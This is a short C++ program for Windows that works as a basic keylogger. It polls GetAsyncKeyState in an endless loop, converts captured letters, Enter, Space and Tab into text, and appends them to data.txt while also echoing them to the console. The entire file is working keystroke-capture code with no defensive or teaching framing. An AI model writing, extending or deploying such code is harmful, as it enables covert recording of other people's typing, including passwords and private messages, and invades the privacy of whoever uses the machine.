#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void log(const string &text) {
    ofstream data("data.txt", ios::app);
    if (data.is_open()) {
        data << text;
    } 
    else {
        cout << "Failed to open file !";
    }
}

string key_to_string(int key){
    if(key >= 'A' && key <= 'Z'){
        return string(1, char(key));
    }
    switch(key){
        case VK_RETURN: return "\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "\t";
        default: return "";
    }   

}

int main(){
    while(true){
        for(int key = 8; key <= 190; key++){

            // GetAsyncKeyState   --> 1000000000000000 & 0x01 
            if(GetAsyncKeyState(key) & 0x01){
                string keySTR = key_to_string(key);
                if(!keySTR.empty()){
                    cout << keySTR;
                    log(keySTR);
                }
            }
        }
    }
    return 0;
}